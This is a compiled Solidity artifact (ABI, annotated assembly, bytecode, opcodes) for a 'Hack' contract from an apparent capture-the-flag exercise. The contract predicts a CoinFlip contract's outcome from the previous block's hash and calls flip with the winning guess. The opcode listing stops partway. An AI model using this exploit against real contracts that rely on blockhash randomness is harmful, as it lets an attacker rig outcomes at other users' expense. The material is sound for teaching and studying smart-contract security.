{
	"CTF/contracts/CoinFlip.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_target",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "flip",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"CTF/contracts/CoinFlip.sol\":57:659  contract Hack {... */\n  mstore(0x40, 0xa0)\n    /* \"CTF/contracts/CoinFlip.sol\":133:210  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"CTF/contracts/CoinFlip.sol\":116:210  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x00\n  sstore\n    /* \"CTF/contracts/CoinFlip.sol\":217:289  constructor(address _target) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"CTF/contracts/CoinFlip.sol\":274:281  _target */\n  dup1\n    /* \"CTF/contracts/CoinFlip.sol\":256:282  target = CoinFlip(_target) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"CTF/contracts/CoinFlip.sol\":217:289  constructor(address _target) {... */\n  pop\n    /* \"CTF/contracts/CoinFlip.sol\":57:659  contract Hack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"CTF/contracts/CoinFlip.sol\":57:659  contract Hack {... */\ntag_6:\n  mload(0x80)\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"CTF/contracts/CoinFlip.sol\":57:659  contract Hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xcde4efa9\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"CTF/contracts/CoinFlip.sol\":295:411  function flip() external {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"CTF/contracts/CoinFlip.sol\":330:340  bool guess */\n      0x00\n        /* \"CTF/contracts/CoinFlip.sol\":343:351  _guess() */\n      tag_7\n        /* \"CTF/contracts/CoinFlip.sol\":343:349  _guess */\n      tag_8\n        /* \"CTF/contracts/CoinFlip.sol\":343:351  _guess() */\n      jump\t// in\n    tag_7:\n        /* \"CTF/contracts/CoinFlip.sol\":330:351  bool guess = _guess() */\n      swap1\n      pop\n        /* \"CTF/contracts/CoinFlip.sol\":369:375  target */\n      immutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n        /* \"CTF/contracts/CoinFlip.sol\":369:380  target.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"CTF/contracts/CoinFlip.sol\":381:386  guess */\n      dup3\n        /* \"CTF/contracts/CoinFlip.sol\":369:387  target.flip(guess) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_12:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n        /* \"CTF/contracts/CoinFlip.sol\":361:404  require(target.flip(guess), \"guess failed\") */\n      tag_15\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_16\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_15:\n        /* \"CTF/contracts/CoinFlip.sol\":320:411  {... */\n      pop\n        /* \"CTF/contracts/CoinFlip.sol\":295:411  function flip() external {... */\n      jump\t// out\n        /* \"CTF/contracts/CoinFlip.sol\":417:657  function _guess() private view returns (bool) {... */\n    tag_8:\n        /* \"CTF/contracts/CoinFlip.sol\":457:461  bool */\n      0x00\n        /* \"CTF/contracts/CoinFlip.sol\":473:491  uint256 blockValue */\n      dup1\n        /* \"CTF/contracts/CoinFlip.sol\":527:528  1 */\n      0x01\n        /* \"CTF/contracts/CoinFlip.sol\":512:524  block.number */\n      number\n        /* \"CTF/contracts/CoinFlip.sol\":512:528  block.number - 1 */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"CTF/contracts/CoinFlip.sol\":502:529  blockhash(block.number - 1) */\n      blockhash\n        /* \"CTF/contracts/CoinFlip.sol\":494:530  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"CTF/contracts/CoinFlip.sol\":473:530  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"CTF/contracts/CoinFlip.sol\":540:556  uint256 coinFlip */\n      0x00\n        /* \"CTF/contracts/CoinFlip.sol\":572:578  FACTOR */\n      dup1\n      sload\n        /* \"CTF/contracts/CoinFlip.sol\":559:569  blockValue */\n      dup3\n        /* \"CTF/contracts/CoinFlip.sol\":559:578  blockValue / FACTOR */\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n        /* \"CTF/contracts/CoinFlip.sol\":540:578  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"CTF/contracts/CoinFlip.sol\":588:597  bool side */\n      0x00\n        /* \"CTF/contracts/CoinFlip.sol\":612:613  1 */\n      0x01\n        /* \"CTF/contracts/CoinFlip.sol\":600:608  coinFlip */\n      dup3\n        /* \"CTF/contracts/CoinFlip.sol\":600:613  coinFlip == 1 */\n      eq\n        /* \"CTF/contracts/CoinFlip.sol\":600:628  coinFlip == 1 ? true : false */\n      tag_23\n      jumpi\n        /* \"CTF/contracts/CoinFlip.sol\":623:628  false */\n      0x00\n        /* \"CTF/contracts/CoinFlip.sol\":600:628  coinFlip == 1 ? true : false */\n      jump(tag_24)\n    tag_23:\n        /* \"CTF/contracts/CoinFlip.sol\":616:620  true */\n      0x01\n        /* \"CTF/contracts/CoinFlip.sol\":600:628  coinFlip == 1 ? true : false */\n    tag_24:\n        /* \"CTF/contracts/CoinFlip.sol\":588:628  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"CTF/contracts/CoinFlip.sol\":646:650  side */\n      dup1\n        /* \"CTF/contracts/CoinFlip.sol\":639:650  return side */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"CTF/contracts/CoinFlip.sol\":417:657  function _guess() private view returns (bool) {... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:97   */\n    tag_25:\n        /* \"#utility.yul\":41:48   */\n      0x00\n        /* \"#utility.yul\":84:89   */\n      dup2\n        /* \"#utility.yul\":77:90   */\n      iszero\n        /* \"#utility.yul\":70:91   */\n      iszero\n        /* \"#utility.yul\":59:91   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:97   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":103:212   */\n    tag_26:\n        /* \"#utility.yul\":184:205   */\n      tag_41\n        /* \"#utility.yul\":199:204   */\n      dup2\n        /* \"#utility.yul\":184:205   */\n      tag_25\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":179:182   */\n      dup3\n        /* \"#utility.yul\":172:206   */\n      mstore\n        /* \"#utility.yul\":103:212   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":218:428   */\n    tag_10:\n        /* \"#utility.yul\":305:309   */\n      0x00\n        /* \"#utility.yul\":343:345   */\n      0x20\n        /* \"#utility.yul\":332:341   */\n      dup3\n        /* \"#utility.yul\":328:346   */\n      add\n        /* \"#utility.yul\":320:346   */\n      swap1\n      pop\n        /* \"#utility.yul\":356:421   */\n      tag_43\n        /* \"#utility.yul\":418:419   */\n      0x00\n        /* \"#utility.yul\":407:416   */\n      dup4\n        /* \"#utility.yul\":403:420   */\n      add\n        /* \"#utility.yul\":394:400   */\n      dup5\n        /* \"#utility.yul\":356:421   */\n      tag_26\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":218:428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":515:632   */\n    tag_28:\n        /* \"#utility.yul\":624:625   */\n      0x00\n        /* \"#utility.yul\":621:622   */\n      dup1\n        /* \"#utility.yul\":614:626   */\n      revert\n        /* \"#utility.yul\":761:877   */\n    tag_30:\n        /* \"#utility.yul\":831:852   */\n      tag_48\n        /* \"#utility.yul\":846:851   */\n      dup2\n        /* \"#utility.yul\":831:852   */\n      tag_25\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":824:829   */\n      dup2\n        /* \"#utility.yul\":821:853   */\n      eq\n        /* \"#utility.yul\":811:871   */\n      tag_49\n      jumpi\n        /* \"#utility.yul\":867:868   */\n      0x00\n        /* \"#utility.yul\":864:865   */\n      dup1\n        /* \"#utility.yul\":857:869   */\n      revert\n        /* \"#utility.yul\":811:871   */\n    tag_49:\n        /* \"#utility.yul\":761:877   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":883:1020   */\n    tag_31:\n        /* \"#utility.yul\":937:942   */\n      0x00\n        /* \"#utility.yul\":968:974   */\n      dup2\n        /* \"#utility.yul\":962:975   */\n      mload\n        /* \"#utility.yul\":953:975   */\n      swap1\n      pop\n        /* \"#utility.yul\":984:1014   */\n      tag_51\n        /* \"#utility.yul\":1008:1013   */\n      dup2\n        /* \"#utility.yul\":984:1014   */\n      tag_30\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":883:1020   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1026:1371   */\n    tag_14:\n        /* \"#utility.yul\":1093:1099   */\n      0x00\n        /* \"#utility.yul\":1142:1144   */\n      0x20\n        /* \"#utility.yul\":1130:1139   */\n      dup3\n        /* \"#utility.yul\":1121:1128   */\n      dup5\n        /* \"#utility.yul\":1117:1140   */\n      sub\n        /* \"#utility.yul\":1113:1145   */\n      slt\n        /* \"#utility.yul\":1110:1229   */\n      iszero\n      tag_53\n      jumpi\n        /* \"#utility.yul\":1148:1227   */\n      tag_54\n      tag_28\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1110:1229   */\n    tag_53:\n        /* \"#utility.yul\":1268:1269   */\n      0x00\n        /* \"#utility.yul\":1293:1354   */\n      tag_55\n        /* \"#utility.yul\":1346:1353   */\n      dup5\n        /* \"#utility.yul\":1337:1343   */\n      dup3\n        /* \"#utility.yul\":1326:1335   */\n      dup6\n        /* \"#utility.yul\":1322:1344   */\n      add\n        /* \"#utility.yul\":1293:1354   */\n      tag_31\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1283:1354   */\n      swap2\n      pop\n        /* \"#utility.yul\":1239:1364   */\n      pop\n        /* \"#utility.yul\":1026:1371   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1377:1546   */\n    tag_32:\n        /* \"#utility.yul\":1461:1472   */\n      0x00\n        /* \"#utility.yul\":1495:1501   */\n      dup3\n        /* \"#utility.yul\":1490:1493   */\n      dup3\n        /* \"#utility.yul\":1483:1502   */\n      mstore\n        /* \"#utility.yul\":1535:1539   */\n      0x20\n        /* \"#utility.yul\":1530:1533   */\n      dup3\n        /* \"#utility.yul\":1526:1540   */\n      add\n        /* \"#utility.yul\":1511:1540   */\n      swap1\n      pop\n        /* \"#utility.yul\":1377:1546   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1552:1714   */\n    tag_33:\n        /* \"#utility.yul\":1692:1706   */\n      0x6775657373206661696c65640000000000000000000000000000000000000000\n        /* \"#utility.yul\":1688:1689   */\n      0x00\n        /* \"#utility.yul\":1680:1686   */\n      dup3\n        /* \"#utility.yul\":1676:1690   */\n      add\n        /* \"#utility.yul\":1669:1707   */\n      mstore\n        /* \"#utility.yul\":1552:1714   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1720:2086   */\n    tag_34:\n        /* \"#utility.yul\":1862:1865   */\n      0x00\n        /* \"#utility.yul\":1883:1950   */\n      tag_59\n        /* \"#utility.yul\":1947:1949   */\n      0x0c\n        /* \"#utility.yul\":1942:1945   */\n      dup4\n        /* \"#utility.yul\":1883:1950   */\n      tag_32\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1876:1950   */\n      swap2\n      pop\n        /* \"#utility.yul\":1959:2052   */\n      tag_60\n        /* \"#utility.yul\":2048:2051   */\n      dup3\n        /* \"#utility.yul\":1959:2052   */\n      tag_33\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":2077:2079   */\n      0x20\n        /* \"#utility.yul\":2072:2075   */\n      dup3\n        /* \"#utility.yul\":2068:2080   */\n      add\n        /* \"#utility.yul\":2061:2080   */\n      swap1\n      pop\n        /* \"#utility.yul\":1720:2086   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2092:2511   */\n    tag_17:\n        /* \"#utility.yul\":2258:2262   */\n      0x00\n        /* \"#utility.yul\":2296:2298   */\n      0x20\n        /* \"#utility.yul\":2285:2294   */\n      dup3\n        /* \"#utility.yul\":2281:2299   */\n      add\n        /* \"#utility.yul\":2273:2299   */\n      swap1\n      pop\n        /* \"#utility.yul\":2345:2354   */\n      dup2\n        /* \"#utility.yul\":2339:2343   */\n      dup2\n        /* \"#utility.yul\":2335:2355   */\n      sub\n        /* \"#utility.yul\":2331:2332   */\n      0x00\n        /* \"#utility.yul\":2320:2329   */\n      dup4\n        /* \"#utility.yul\":2316:2333   */\n      add\n        /* \"#utility.yul\":2309:2356   */\n      mstore\n        /* \"#utility.yul\":2373:2504   */\n      tag_62\n        /* \"#utility.yul\":2499:2503   */\n      dup2\n        /* \"#utility.yul\":2373:2504   */\n      tag_34\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":2365:2504   */\n      swap1\n      pop\n        /* \"#utility.yul\":2092:2511   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2517:2594   */\n    tag_35:\n        /* \"#utility.yul\":2554:2561   */\n      0x00\n        /* \"#utility.yul\":2583:2588   */\n      dup2\n        /* \"#utility.yul\":2572:2588   */\n      swap1\n      pop\n        /* \"#utility.yul\":2517:2594   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2600:2780   */\n    tag_36:\n        /* \"#utility.yul\":2648:2725   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2645:2646   */\n      0x00\n        /* \"#utility.yul\":2638:2726   */\n      mstore\n        /* \"#utility.yul\":2745:2749   */\n      0x11\n        /* \"#utility.yul\":2742:2743   */\n      0x04\n        /* \"#utility.yul\":2735:2750   */\n      mstore\n        /* \"#utility.yul\":2769:2773   */\n      0x24\n        /* \"#utility.yul\":2766:2767   */\n      0x00\n        /* \"#utility.yul\":2759:2774   */\n      revert\n        /* \"#utility.yul\":2786:2980   */\n    tag_20:\n        /* \"#utility.yul\":2826:2830   */\n      0x00\n        /* \"#utility.yul\":2846:2866   */\n      tag_66\n        /* \"#utility.yul\":2864:2865   */\n      dup3\n        /* \"#utility.yul\":2846:2866   */\n      tag_35\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2841:2866   */\n      swap2\n      pop\n        /* \"#utility.yul\":2880:2900   */\n      tag_67\n        /* \"#utility.yul\":2898:2899   */\n      dup4\n        /* \"#utility.yul\":2880:2900   */\n      tag_35\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":2875:2900   */\n      swap3\n      pop\n        /* \"#utility.yul\":2924:2925   */\n      dup3\n        /* \"#utility.yul\":2921:2922   */\n      dup3\n        /* \"#utility.yul\":2917:2926   */\n      sub\n        /* \"#utility.yul\":2909:2926   */\n      swap1\n      pop\n        /* \"#utility.yul\":2948:2949   */\n      dup2\n        /* \"#utility.yul\":2942:2946   */\n      dup2\n        /* \"#utility.yul\":2939:2950   */\n      gt\n        /* \"#utility.yul\":2936:2973   */\n      iszero\n      tag_68\n      jumpi\n        /* \"#utility.yul\":2953:2971   */\n      tag_69\n      tag_36\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2936:2973   */\n    tag_68:\n        /* \"#utility.yul\":2786:2980   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2986:3166   */\n    tag_37:\n        /* \"#utility.yul\":3034:3111   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3031:3032   */\n      0x00\n        /* \"#utility.yul\":3024:3112   */\n      mstore\n        /* \"#utility.yul\":3131:3135   */\n      0x12\n        /* \"#utility.yul\":3128:3129   */\n      0x04\n        /* \"#utility.yul\":3121:3136   */\n      mstore\n        /* \"#utility.yul\":3155:3159   */\n      0x24\n        /* \"#utility.yul\":3152:3153   */\n      0x00\n        /* \"#utility.yul\":3145:3160   */\n      revert\n        /* \"#utility.yul\":3172:3357   */\n    tag_22:\n        /* \"#utility.yul\":3212:3213   */\n      0x00\n        /* \"#utility.yul\":3229:3249   */\n      tag_72\n        /* \"#utility.yul\":3247:3248   */\n      dup3\n        /* \"#utility.yul\":3229:3249   */\n      tag_35\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":3224:3249   */\n      swap2\n      pop\n        /* \"#utility.yul\":3263:3283   */\n      tag_73\n        /* \"#utility.yul\":3281:3282   */\n      dup4\n        /* \"#utility.yul\":3263:3283   */\n      tag_35\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":3258:3283   */\n      swap3\n      pop\n        /* \"#utility.yul\":3302:3303   */\n      dup3\n        /* \"#utility.yul\":3292:3327   */\n      tag_74\n      jumpi\n        /* \"#utility.yul\":3307:3325   */\n      tag_75\n      tag_37\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":3292:3327   */\n    tag_74:\n        /* \"#utility.yul\":3349:3350   */\n      dup3\n        /* \"#utility.yul\":3346:3347   */\n      dup3\n        /* \"#utility.yul\":3342:3351   */\n      div\n        /* \"#utility.yul\":3337:3351   */\n      swap1\n      pop\n        /* \"#utility.yul\":3172:3357   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220885c08c821e9c345f51806944c0076069eb4b173ecf80fbe61a30c9a8611a3d464736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60a06040527f80000000000000000000000000000000000000000000000000000000000000005f55348015610032575f80fd5b5060405161048c38038061048c833981810160405281019061005491906100ec565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff168152505050610117565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100bb82610092565b9050919050565b6100cb816100b1565b81146100d5575f80fd5b50565b5f815190506100e6816100c2565b92915050565b5f602082840312156101015761010061008e565b5b5f61010e848285016100d8565b91505092915050565b60805161035e61012e5f395f6044015261035e5ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c8063cde4efa91461002d575b5f80fd5b610035610037565b005b5f61004061011d565b90507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b815260040161009b9190610178565b6020604051808303815f875af11580156100b7573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100db91906101bf565b61011a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161011190610244565b60405180910390fd5b50565b5f8060014361012c9190610298565b405f1c90505f80548261013f91906102f8565b90505f60018214610150575f610153565b60015b905080935050505090565b5f8115159050919050565b6101728161015e565b82525050565b5f60208201905061018b5f830184610169565b92915050565b5f80fd5b61019e8161015e565b81146101a8575f80fd5b50565b5f815190506101b981610195565b92915050565b5f602082840312156101d4576101d3610191565b5b5f6101e1848285016101ab565b91505092915050565b5f82825260208201905092915050565b7f6775657373206661696c656400000000000000000000000000000000000000005f82015250565b5f61022e600c836101ea565b9150610239826101fa565b602082019050919050565b5f6020820190508181035f83015261025b81610222565b9050919050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6102a282610262565b91506102ad83610262565b92508282039050818111156102c5576102c461026b565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61030282610262565b915061030d83610262565b92508261031d5761031c6102cb565b5b82820490509291505056fea2646970667358221220885c08c821e9c345f51806944c0076069eb4b173ecf80fbe61a30c9a8611a3d464736f6c634300081a0033",
					"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH0 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x32 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x48C CODESIZE SUB DUP1 PUSH2 0x48C DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x54 SWAP2 SWAP1 PUSH2 0xEC JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0x117 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBB DUP3 PUSH2 0x92 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xCB DUP2 PUSH2 0xB1 JUMP JUMPDEST DUP2 EQ PUSH2 0xD5 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xE6 DUP2 PUSH2 0xC2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x101 JUMPI PUSH2 0x100 PUSH2 0x8E JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x10E DUP5 DUP3 DUP6 ADD PUSH2 0xD8 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH2 0x35E PUSH2 0x12E PUSH0 CODECOPY PUSH0 PUSH1 0x44 ADD MSTORE PUSH2 0x35E PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x35 PUSH2 0x37 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH2 0x40 PUSH2 0x11D JUMP JUMPDEST SWAP1 POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9B SWAP2 SWAP1 PUSH2 0x178 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB7 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xDB SWAP2 SWAP1 PUSH2 0x1BF JUMP JUMPDEST PUSH2 0x11A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x111 SWAP1 PUSH2 0x244 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x1 